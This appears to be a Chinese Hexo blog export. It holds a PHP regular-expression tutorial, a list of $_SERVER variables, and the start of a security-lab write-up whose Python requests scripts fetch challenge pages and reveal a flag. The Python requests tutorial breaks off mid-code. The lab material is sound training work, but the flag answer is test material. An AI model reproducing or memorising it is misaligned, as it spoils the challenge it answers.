string">"&lt;hr/>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$str</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;hr/>"</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//echo preg_replace("/&lt;li>(.*?)&lt;\/li>/","&lt;li>&lt;b>\\1&lt;/b>&lt;/li>",$str);</span><span class="token comment" spellcheck="true">//echo preg_replace("/</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span></span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token operator">*</span><span class="token operator">?</span><span class="token punctuation">)</span><span class="token markup">&lt;\/li></span><span class="token operator">/</span><span class="token string">","</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>b</span><span class="token punctuation">></span></span></span>\<span class="token variable">$1</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>b</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span></span>"<span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">"/&lt;li>(.*?)&lt;\/li>/"</span><span class="token punctuation">,</span><span class="token string">'&lt;li>&lt;b>$1&lt;/b>&lt;/li>'</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="5-子存储-扩展"><a href="#5-子存储-扩展" class="headerlink" title="5.子存储(扩展)"></a>5.子存储(扩展)</h4><pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">//子存储使用</span><span class="token variable">$date</span><span class="token operator">=</span><span class="token string">"[2012-08-09],[2012,09-19],[2011/08,09],[2012/10/09],[2013,08,01]"</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//将上面字串中合法的日期匹配出来</span><span class="token function">preg_match_all</span><span class="token punctuation">(</span><span class="token string">"/\[[0-9]{4}([\-,\/])[0-9]{2}\\1[0-9]{2}\]/"</span><span class="token punctuation">,</span><span class="token variable">$date</span><span class="token punctuation">,</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;hr/>"</span><span class="token punctuation">;</span><span class="token variable">$str</span> <span class="token operator">=</span> "<span class="token operator">&lt;</span>ulstyle<span class="token operator">=</span><span class="token string">'color:red'</span><span class="token operator">></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">/></span></span></span>   <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span></span>aaaaa<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span></span>   <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span></span>bbbbb<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span></span>   <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span></span>ddddd<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span></span>   <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span></span>eeeee<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span></span>  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span></span>"<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//将上面字串中的html标记删除掉(替换空)</span><span class="token keyword">echo</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">"/&lt;\/?.*?\/?>/s"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="4-匹配先后顺序："><a href="#4-匹配先后顺序：" class="headerlink" title="4.匹配先后顺序："></a>4.匹配先后顺序：</h5><pre><code>各种操作符的运算优先级 ：      相同优先级的从左到右进行运算，不同优先级的运算先高后低。各种操作符的优先级从高到低如下：   操作符 描述   \ 转义符   (), (?:), (?=), [] 圆括号和方括号   *, +, ?, {n}, {n,}, {n,m} 限定符   ^, $, \anymetacharacter 位置和顺序   | “或”操作 </code></pre><h4 id="5-其他的理解"><a href="#5-其他的理解" class="headerlink" title="5.其他的理解:"></a><a href="https://blog.csdn.net/qianqian_0825/article/details/88558268?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161572421716780266231984%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=161572421716780266231984&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~baidu_landing_v2~default-1-88558268.first_rank_v2_pc_rank_v29&utm_term=%2F%28%5B%5Cw%5C-%5D%2B%5C%40%5B%5Cw%5C-%5D%2B%5C.%5B%5Cw%5C-%5D%2B%29%2F" target="_blank" rel="noopener">5.其他的理解:</a></h4><h5 id="1-w-w-w"><a href="#1-w-w-w" class="headerlink" title="1./([\w-]+\@[\w-]+.[\w-]+)/"></a>1./([\w-]+\@[\w-]+.[\w-]+)/</h5><pre><code>[\w\-]+</code></pre><p>这个是匹配了多个范围为所有的单词字符加上数字还有-的字符，，如 “aaa” “-ab” “c” “s._-l”</p><pre><code>\@[\w\-]+</code></pre><p>匹配到@后再匹配@后面的多个范围为：所有的字符+数字，-的字符</p><pre><code>\.[\w\-]+</code></pre><p>同上</p><h5 id="2-a-zA-Z"><a href="#2-a-zA-Z" class="headerlink" title="2./^[a-zA-Z ]*$/"></a>2./^[a-zA-Z ]*$/</h5><pre><code>/^$/ :完整表达式^ :表示以什么开始，或者取反$ :结束^[A-Za-z_] : 以字母开始，无论大小都可以；[^A-Za-z_] :非字母就可以；*    重复0次或更多次</code></pre><p>也就是对$name里面的东西，要求以字母的形式开头，连续匹配多次</p><h5 id="3-b-https-ftp-www-a-z0-9-amp-a-z0-9-amp-i"><a href="#3-b-https-ftp-www-a-z0-9-amp-a-z0-9-amp-i" class="headerlink" title="3./\b(?:(?:https?|ftp):\/\/|www.)[-a-z0-9+&amp;@#\/%?=_|!:,.;]*[-a-z0-9+&amp;@#\/%=_|]/i"></a>3./\b(?:(?:https?|ftp):\/\/|www.)[-a-z0-9+&amp;@#\/%?=<del>_|!:,.;]*[-a-z0-9+&amp;@#\/%=</del>_|]/i</h5><pre><code>\b 字符的位置是非常重要的。如果它位于要匹配的字符串的开始，它在单词的开始处查找匹配项。如果它位于字符串的结尾，它在单词的结尾处查找匹配项。例如，下面的表达式匹配单词 Chapter 中的字符串 ter，因为它出现在单词边界的前面：/ter\b/</code></pre><h5 id="4-https-ftp-www"><a href="#4-https-ftp-www" class="headerlink" title="4.(?:(?:https?|ftp):\/\/|www.)"></a>4.(?:(?:https?|ftp):\/\/|www.)</h5><pre><code>(?:pattern)    匹配 pattern 但不获取匹配结果，也就是说这是一个非获取匹配，不进行存储供以后使用。这在使用 &quot;或&quot; 字符 (|) 来组合一个模式的各个部分是很有用。例如， &#39;industr(?:y|ies) 就是一个比 &#39;industry|industries&#39; 更简略的表达式。</code></pre><p>这里就是对后面的进行“或”的匹配形式，此处显示对https?与ftp进行查找，这个组后面跟着字符 : ，它会按字面进行匹配，找到以后对https://或者ftp://与www.进行选择，经过自行调试，发现</p><p><a href="https://www" target="_blank" rel="noopener">https://www</a>.</p><p><a href="ftp://www" target="_blank" rel="noopener">ftp://www</a>.</p><p>www.</p><p>这三个均可以</p><pre><code> * 匹配前面的子表达式零次或多次。例如，zo* 能匹配 &quot;z&quot; 以及 &quot;zoo&quot;。* 等价于{0,}。 </code></pre><h1 id="PHP超全局变量-SERVER"><a href="#PHP超全局变量-SERVER" class="headerlink" title="PHP超全局变量$_SERVER"></a>PHP超全局变量$_SERVER</h1><p>$_SERVER 是一个包含了诸如头信息(header)、路径(path)、以及脚本位置(script locations)等等信息的数组。这个数组中的项目由 Web 服务器创建。不能保证每个服务器都提供全部项目；服务器可能会忽略一些，或者提供一些没有在这里列举出来的项目。</p><ol><li>$_SERVER[‘HTTP_HOST’] 请求头信息中的Host内容，获取当前域名。</li><li>$_SERVER[“SERVER_NAME”] 输出配置文件httpd.conf中的ServerName，一般情况下与HTTP_HOST值相同，但如果服务器端口不是默认的80端口，或者协议规范不是HTTP/1.1时，HTTP_HOST会包含这些信息，而SERVER_NAME不一定包含。（主要看配置文件的设置）。</li><li>$_SERVER[“HTTP_USER_AGENT”] 获取用户相关信息，包括用户浏览器、操作系统等信息。</li><li>$_SERVER[‘HTTP_ACCEPT’] 当前请求的ACCEPT头部信息。</li><li>$_SERVER[“HTTP_ACCEPT_LANGUAGE”] 这个值是由浏览器发送，表明用户默认的语言设置，后面的q值表示用户对该语言的喜好程度。</li><li>$_SERVER[“HTTP_ACCEPT_ENCODING”] 大部分的现代浏览器都支持gzip压缩，并会把这一信息报告给服务器。这时服务器就会压缩过的HTML发送给浏览器。这可以减少近80%的文件大小，以节省下载时间和带宽。</li><li>$_SERVER[“HTTP_COOKIE”] 浏览器的cookie信息。</li><li>$_SERVER[“HTTP_CONNECTION”] 当前请求的连接情况。</li><li>$_SERVER[“HTTP_UPGRADE_INSECURE_REQUESTS”] 表示浏览器可读懂服务器发过来的请求，</li><li>$_SERVER[“HTTP_CACHE_CONTROL”] 表示浏览器是否会缓存这个页面信息。</li><li>$_SERVER[“PATH”] 当前脚本所在文件系统。</li><li>$_SERVER[“SystemRoot”] 当前服务器的操作系统。</li><li>$_SERVER[“COMSPEC”] 指向cmd.exe的路径。</li><li>$_SERVER[“PATHEXT”] 环境变量设置。</li><li>$_SERVER[“WINDIR”] 脚本指向的系统目录。</li><li>$_SERVER[“SERVER_SIGNATURE”] 包含服务器版本和虚拟主机名的字符串。</li><li>$_SERVER[“SERVER_SOFTWARE”] 服务器软件配置信息。</li><li>$_SERVER[“SERVER_ADDR”] 当前运行脚本的服务器的ip地址。</li><li>$_SERVER[“SERVER_PORT”] 服务器端口。</li><li>$_SERVER[“REMOTE_ADDR”] 浏览网页的用户ip。</li><li>$_SERVER[“DOCUMENT_ROOT”] 当前运行脚本所在的根目录。</li><li>$_SERVER[“REQUEST_SCHEME”] 服务器通信协议，是http或https。</li><li>$_SERVER[“CONTEXT_PREFIX”] 前缀。</li><li>$_SERVER[“CONTEXT_DOCUMENT_ROOT”] 当前脚本所在的文档根目录。</li><li>$_SERVER[“SERVER_ADMIN”] 服务器管理员信息。</li><li>$_SERVER[“SCRIPT_FILENAME”] 当前执行脚本的绝对路径。</li><li>$_SERVER [“REMOTE_PORT”] 用户连接到服务器时所使用的端口。</li><li>$_SERVER[“GATEWAY_INTERFACE”] 服务器使用的CGI规范的版本。</li><li>$_SERVER[“SERVER_PROTOCOL”] 请求页面时通信协议的名称和版本。</li><li>$_SERVER[“REQUEST_METHOD”] 请求提交数据的方式。</li><li>$_SERVER[“QUERY_STRING”] 服务器请求时？后面的参数。</li><li>$_SERVER[“REQUEST_URI”] 当前脚本路径，根目录之后的目录。</li><li>$_SERVER[“SCRIPT_NAME”] 当前脚本的路径。这在页面需要指向自己时非常有用。</li><li>$_SERVER[“PHP_SELF”] 当前正在执行脚本的文件名。</li><li>$_SERVER[“REQUEST_TIME”] 得到请求开始时的时间戳。</li></ol>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> 函数 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络安全lab</title>
      <link href="/2021/02/10/wang-luo-an-quan-lab/"/>
      <url>/2021/02/10/wang-luo-an-quan-lab/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="脚本关"><a href="#脚本关" class="headerlink" title="脚本关"></a>脚本关</h1><h2 id="key又又找不到了"><a href="#key又又找不到了" class="headerlink" title="key又又找不到了"></a>key又又找不到了</h2><p>分值: 200</p><p>小明这次哭了，key又找不到了！！！ key啊，你究竟藏到了哪里，为什么我看到的页面上都没有啊！！！！！！</p><p>右键查看源代码</p><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>content-type<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/html;charset<span class="token punctuation">=</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>./search_key.php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>_到这里找key__<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>编写脚本：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://lab1.xseclab.com/xss1_30ac8668cd453e7e387c76b132b140bb/search_key.php"</span>res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>这就好像模拟了抓包的一个过程</p><p>得到：key is : yougotit_script_now</p><h2 id="快速口算"><a href="#快速口算" class="headerlink" title="快速口算"></a>快速口算</h2><p>分值: 350</p><p>小明要参加一个高技能比赛，要求每个人都要能够快速口算四则运算，2秒钟之内就能够得到结果，但是小明就是一个小学生没有经过特殊的培训，那小明能否通过快速口算测验呢？</p><p>恶补基础↓：</p><h3 id="1-Requests模块的简单使用"><a href="#1-Requests模块的简单使用" class="headerlink" title="1.Requests模块的简单使用"></a><strong>1.Requests模块的简单使用</strong></h3><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#HTTP请求类型</span><span class="token comment" spellcheck="true">#无参数的get类型</span>r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'http://httpbin.org/get'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#有参的get类型</span>payload <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'key1'</span><span class="token punctuation">:</span><span class="token string">'vaule1'</span><span class="token punctuation">,</span><span class="token string">'key2'</span><span class="token punctuation">:</span><span class="token string">'value2'</span><span class="token punctuation">}</span>r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>params<span class="token operator">=</span>payload<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#无参的post类型</span>r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">"http://httpbin.org/post"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#有参的post类型</span>r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>payload<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#data不光可以接受字典类型的数据，还可以接受json等格式</span><span class="token keyword">import</span> jsonpayload <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'a'</span><span class="token punctuation">:</span><span class="token string">'杨'</span><span class="token punctuation">,</span><span class="token string">'b'</span><span class="token punctuation">:</span><span class="token string">'hello'</span><span class="token punctuation">}</span>r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">'http://httpbin.org/post'</span><span class="token punctuation">,</span> data<span class="token operator">=</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#发送文件的post类型，这个相当于向网站上传一张图片，文档等操作，这时要使用files参数</span>files <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'file'</span><span class="token punctuation">:</span> open<span class="token punctuation">(</span><span class="token string">'touxiang.png'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span><span class="token punctuation">}</span>r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">'http://httpbin.org/post'</span><span class="token punctuation">,</span> files<span class="token operator">=</span>files<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#put类型</span>r <span class="token operator">=</span> requests<span class="token punctuation">.</span>put<span class="token punctuation">(</span><span class="token string">"http://m.ctrip.com/put"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#delete类型</span>r <span class="token operator">=</span> requests<span class="token punctuation">.</span>delete<span class="token punctuation">(</span><span class="token string">"http://m.ctrip.com/delete"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#head类型</span>r <span class="token operator">=</span> requests<span class="token punctuation">.</span>head<span class="token punctuation">(</span><span class="token string">"http://m.ctrip.com/head"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#options类型</span>r <span class="token operator">=</span> requests<span class="token punctuation">.</span>options<span class="token punctuation">(</span><span class="token string">"http://m.ctrip.com/get"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#获取响应内容</span><span class="token keyword">print</span> r<span class="token punctuation">.</span>content <span class="token comment" spellcheck="true">#以字节的方式去显示，中文显示为字符</span><span class="token keyword">print</span> r<span class="token punctuation">.</span>text <span class="token comment" spellcheck="true">#以文本的方式去显示</span><span class="token comment" spellcheck="true">#URL传递参数</span>payload <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'keyword'</span><span class="token punctuation">:</span> <span class="token string">'日本'</span><span class="token punctuation">,</span> <span class="token string">'salecityid'</span><span class="token punctuation">:</span> <span class="token string">'2'</span><span class="token punctuation">}</span>r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"http://m.ctrip.com/webapp/tourvisa/visa_list"</span><span class="token punctuation">,</span> params<span class="token operator">=</span>payload<span class="token punctuation">)</span><span class="token keyword">print</span> r<span class="token punctuation">.</span>url <span class="token comment" spellcheck="true">#示例为http://m.ctrip.com/webapp/tourvisa/visa_list?salecityid=2&amp;keyword=日本</span><span class="token comment" spellcheck="true">#获取/修改网页编码</span>r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'https://github.com/timeline.json'</span><span class="token punctuation">)</span><span class="token keyword">print</span> r<span class="token punctuation">.</span>encodingr<span class="token punctuation">.</span>encoding <span class="token operator">=</span> <span class="token string">'utf-8'</span><span class="token comment" spellcheck="true">#json处理</span>r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'https://github.com/timeline.json'</span><span class="token punctuation">)</span><span class="token keyword">print</span> r<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#需要先import json</span><span class="token comment" spellcheck="true">#定制请求头</span>url <span class="token operator">=</span> <span class="token string">'http://m.ctrip.com'</span>headers <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'User-Agent'</span> <span class="token punctuation">:</span> <span class="token string">'Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 4 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.166 Mobile Safari/535.19'</span><span class="token punctuation">}</span>r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span><span class="token keyword">print</span> r<span class="token punctuation">.</span>request<span class="token punctuation">.</span>headers<span class="token comment" spellcheck="true">#复杂post请求</span>url <span class="token operator">=</span> <span class="token string">'http://m.ctrip.com'</span>payload <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'some'</span><span class="token punctuation">:</span> <span class="token string">'data'</span><span class="token punctuation">}</span>r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#如果传递的payload是string而不是dict，需要先调用dumps方法格式化一下</span><span class="token comment" spellcheck="true">#post多部分编码文件</span>url <span class="token operator">=</span> <span class="token string">'http://m.ctrip.com'</span>files <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'file'</span><span class="token punctuation">:</span> open<span class="token punctuation">(</span><span class="token string">'report.xls'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span><span class="token punctuation">}</span>r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> files<span class="token operator">=</span>files<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#响应状态码</span>r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'http://m.ctrip.com'</span><span class="token punctuation">)</span><span class="token keyword">print</span> r<span class="token punctuation">.</span>status_code<span class="token comment" spellcheck="true">#响应头</span>r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'http://m.ctrip.com'</span><span class="token punctuation">)</span><span class="token keyword">print</span> r<span class="token punctuation">.</span>headers<span class="token keyword">print</span> r<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'Content-Type'</span><span class="token punctuation">]</span><span class="token keyword">print</span> r<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'content-type'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#访问响应头部分内容的两种方式</span><span class="token comment" spellcheck="true">#Cookies</span>r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'http://www.baidu.com'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>cookies<span class="token punctuation">[</span><span class="token string">'BAIDUID'</span><span class="token punctuation">]</span>  <span class="token comment" spellcheck="true">#读取cookies</span>url <span class="token operator">=</span> <span class="token string">'http://m.ctrip.com/cookies'</span>cookies <span class="token operator">=</span> dict<span class="token punctuation">(</span>cookies_are<span class="token operator">=</span><span class="token string">'working'</span><span class="token punctuation">)</span>r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> cookies<span class="token operator">=</span>cookies<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#发送cookies</span><span class="token comment" spellcheck="true">#设置超时时间</span>r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'http://m.ctrip.com'</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">0.001</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#访问中使用session</span>s <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#先初始化一个session对象</span>r <span class="token operator">=</span> s<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data <span class="token operator">=</span> user<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#然后使用这个session对象来进行访问，将requests中的session类实例化为一个对象。以便于在请求头中自动加上session id。</span><span class="token comment" spellcheck="true">#设置访问代理</span>proxies <span class="token operator">=</span> <span class="token punctuation">{</span>           <span class="token string">"http"</span><span class="token punctuation">:</span> <span class="token string">"http://10.10.10.10:8888"</span><span class="token punctuation">,</span>           <span class="token string">"https"</span><span class="token punctuation">:</span> <span class="token string">"http://10.10.10.100:4444"</span><span class="token punctuation">,</span>          <span class="token punctuation">}</span>r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'http://m.ctrip.com'</span><span class="token punctuation">,</span> proxies<span class="token operator">=</span>proxies<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-json请求"><a href="#2-json请求" class="headerlink" title="2.json请求"></a>2.json请求</h3><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/user/bin/env python</span><span class="token comment" spellcheck="true">#coding=utf-8</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> json<span class="token keyword">class</span> <span class="token class-name">url_request</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token triple-quoted-string string">""" init """</span><span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span>    headers <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'Content-Type'</span> <span class="token punctuation">:</span> <span class="token string">'application/json'</span><span class="token punctuation">}</span>    payload <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'CountryName'</span><span class="token punctuation">:</span><span class="token string">'中国'</span><span class="token punctuation">,</span>               <span class="token string">'ProvinceName'</span><span class="token punctuation">:</span><span class="token string">'陕西省'</span><span class="token punctuation">,</span>               <span class="token string">'L1CityName'</span><span class="token punctuation">:</span><span class="token string">'汉中'</span><span class="token punctuation">,</span>               <span class="token string">'L2CityName'</span><span class="token punctuation">:</span><span class="token string">'城固'</span><span class="token punctuation">,</span>               <span class="token string">'TownName'</span><span class="token punctuation">:</span><span class="token string">''</span><span class="token punctuation">,</span>               <span class="token string">'Longitude'</span><span class="token punctuation">:</span><span class="token string">'107.33393'</span><span class="token punctuation">,</span>               <span class="token string">'Latitude'</span><span class="token punctuation">:</span><span class="token string">'33.157131'</span><span class="token punctuation">,</span>               <span class="token string">'Language'</span><span class="token punctuation">:</span><span class="token string">'CN'</span>               <span class="token punctuation">}</span>    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">"http://www.xxxxxx.com/CityLocation/json/LBSLocateCity"</span><span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">,</span>data<span class="token operator">=</span>payload<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#r.encoding = 'utf-8'</span>    data<span class="token operator">=</span>r<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> r<span class="token punctuation">.</span>status_code<span class="token operator">!=</span><span class="token number">200</span><span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"LBSLocateCity API Error "</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>r<span class="token punctuation">.</span>status_code<span class="token punctuation">)</span>    <span class="token keyword">print</span> data<span class="token 